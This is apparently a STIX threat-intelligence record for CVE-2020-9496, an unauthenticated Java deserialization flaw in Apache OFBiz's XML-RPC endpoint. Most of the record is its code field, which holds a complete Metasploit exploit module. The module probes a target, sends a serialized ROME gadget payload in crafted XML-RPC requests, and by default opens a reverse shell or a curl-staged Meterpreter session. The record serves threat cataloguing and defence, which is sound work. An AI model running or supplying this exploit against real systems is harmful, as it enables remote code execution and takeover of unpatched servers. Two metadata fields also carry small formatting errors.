{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c80aff09-a7e9-414f-878c-6e2cbb8b3a0c",
    "created": "2024-08-14T17:03:15.689385Z",
    "modified": "2024-08-14T17:03:15.68939Z",
    "name": "Apache OFBiz XML-RPC Java Deserialization",
    "description": " This module exploits a Java deserialization vulnerability in Apache OFBiz's unauthenticated XML-RPC endpoint /webtools/control/xmlrpc for versions prior to 17.12.04. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/apache_ofbiz_deserialization.rb",
            "external_id": "apache_ofbiz_deserialization.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-9496"
        },
        {
            "source_name": "reference",
            "url": "https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz"
        },
        {
            "source_name": "reference",
            "url": "https://ofbiz.apache.org/release-notes-17.12.04.html"
        },
        {
            "source_name": "reference",
            "url": "https://issues.apache.org/jira/browse/OFBIZ-11716"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::JavaDeserialization\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache OFBiz XML-RPC Java Deserialization',\n        'Description' => %q{\n          This module exploits a Java deserialization vulnerability in Apache\n          OFBiz's unauthenticated XML-RPC endpoint /webtools/control/xmlrpc for\n          versions prior to 17.12.04.\n        },\n        'Author' => [\n          'Alvaro Mu\u00f1oz', # Discovery\n          'wvu' # Exploit\n        ],\n        'References' => [\n          ['CVE', '2020-9496'],\n          ['URL', 'https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz'],\n          ['URL', 'https://ofbiz.apache.org/release-notes-17.12.04.html'],\n          ['URL', 'https://issues.apache.org/jira/browse/OFBIZ-11716']\n        ],\n        'DisclosureDate' => '2020-07-13', # Vendor release note\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_python_ssl'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :curl,\n                'PAYLOAD' => 'linux/x64/meterpreter_reverse_https'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DefaultOptions' => {\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(8443),\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    # Send an empty serialized object\n    res = send_request_xmlrpc('')\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    if res.body.include?('Failed to read result object: null')\n      return CheckCode::Vulnerable('Target can deserialize arbitrary data.')\n    end\n\n    CheckCode::Safe('Target cannot deserialize arbitrary data.')\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    res = send_request_xmlrpc(\n      # framework/webapp/lib/rome-0.9.jar\n      generate_java_deserialization_for_command('ROME', 'bash', cmd)\n    )\n\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Failed to execute command: #{cmd}\")\n    end\n\n    print_good(\"Successfully executed command: #{cmd}\")\n  end\n\n  def send_request_xmlrpc(data)\n    # http://xmlrpc.com/\n    # https://ws.apache.org/xmlrpc/\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/webtools/control/xmlrpc'),\n      'ctype' => 'text/xml',\n      'data' => <<~XML\n        <?xml version=\"1.0\"?>\n        <methodCall>\n          <methodName>#{rand_text_alphanumeric(8..42)}</methodName>\n          <params>\n            <param>\n              <value>\n                <struct>\n                  <member>\n                    <name>#{rand_text_alphanumeric(8..42)}</name>\n                    <value>\n                      <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">#{Rex::Text.encode_base64(data)}</serializable>\n                    </value>\n                  </member>\n                </struct>\n              </value>\n            </param>\n          </params>\n        </methodCall>\n      XML\n    )\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-07-13, # Vendor release note",
    "x_mitre_platforms": [
        "linux'"
    ]
}